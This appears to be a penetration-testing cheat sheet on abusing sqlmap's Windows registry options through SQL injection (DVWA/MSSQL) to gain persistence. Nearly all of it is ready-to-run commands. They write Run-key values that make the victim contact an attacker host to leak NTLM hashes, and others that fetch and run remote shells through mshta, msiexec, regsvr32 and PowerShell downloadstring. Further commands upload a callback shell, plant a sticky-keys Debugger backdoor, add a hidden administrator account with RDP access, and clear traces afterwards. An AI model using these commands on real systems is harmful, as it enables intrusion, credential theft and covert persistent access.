# Windows Registry

## 01 - Create Registry Values

TODO: Provide examples for windows OS enumeration using windows registry commands to apply the same methods in [[Registry|lateral movement]] and [[Registry Keys|persistence methods]]. Also provide a scenario if it's not possible to reboot the windows machine. An attacker can use **Denial of Service (DoS)** attack vector to crash the machine then it reboots to get a callback shell.

Note: This feature only supports for MSSQL backend.

### 1.1 - Grab NTLM hashes

- Run [[Pentesting Phases/Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "cmd.exe /c dir \\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "cmd.exe /c net view \\\\<attacker_IP>\\snare.txt"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater
```

### 1.2 - Execute callback shell in disk

- **Upload a callback shell in the windows temporary directory.**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --file-write=/path/to/shell.exe --file-dest="C:\Windows\Temp\shell.exe"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "C:\Windows\Temp\shell.exe"
```

- **Then confirm the registry value is updated successfully.**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater
```

- **Cleanup the registry value and confirm it's deleted.**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-del "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater
```

### 1.3 - Execute callback shell in memory (fileless)

#### 1.3.1 - Host a webserver to stage the implant

- **Mshta**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "mshta.exe http://<IP>/shell.hta"
```

- **Msiexec**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "msiexec /q /i http://<attacker_IP>/shell.msi"
```

- **Regsvr32**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "regsvr32 /s /n /u /i:http://<attacker_IP>/shell.sct scrobj.dll"
```

- **Powershell**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "powershell.exe -nop -NonI -Nologo -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\'http://<IP>/shell.ps1\'))\""
```

#### 1.3.2 - Directly execute the callback shell

- **Powershell**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "conhost --headless powershell.exe -nop -NonI -Nologo -w hidden -e <base64_payload>"
```

- **Cleanup the registry value and confirm it's deleted.**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-del "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater
```

#### 1.3.3 - Living off the Land

##### 1.3.3.1 - Remote Desktop Protocol via Stick Key Command Prompt

- **We must first take note of the registry values to clear traces afterwards**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value Debugger
```

- **Add a terminal prompt in the registry value.**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value Debugger --reg-type=REG_SZ --reg-data "cmd.exe"

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value Debugger --reg-type=REG_SZ --reg-data "powershell.exe"
```

- **Create user account (Optional). Refer to this [[Pentesting Phases/Post Exploitation/Shell Is The Beginning/Persistence/Windows/Host Persistence/Create User|link]].**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater --reg-data "cmd /c net user webadmin Passw0rd123\! /add /y & net localgroup Administrators webadmin /add /y & net localgroup \"Remote Desktop Users\" webadmin /add /y"
```

- **Then confirm the modified changes.**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" --reg-value Debugger

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater
```

- **Cleanup the registry value and double check to confirm.**

```
$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-del "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater

$ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --technique=U --reg-read "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" --reg-value Updater
```